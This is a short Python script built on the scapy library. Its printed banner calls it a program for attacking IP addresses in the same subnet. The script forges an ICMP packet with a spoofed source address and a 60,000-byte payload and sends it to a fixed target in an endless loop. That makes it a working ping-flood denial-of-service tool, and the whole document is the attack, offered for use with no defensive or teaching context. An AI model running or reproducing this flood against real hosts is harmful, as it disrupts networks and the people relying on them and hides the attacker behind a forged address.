from scapy.all import *

print "-"*60
print "This program very useful for attack ip in same subnet with us"
print "But this very weakness if you attacking some website in other network"
print "-"*60


ip1 = IP(src="10.133.1.181",dst="10.133.1.153")
packet = ip1/ICMP()/("m"*60000)
while True:
  send(packet)
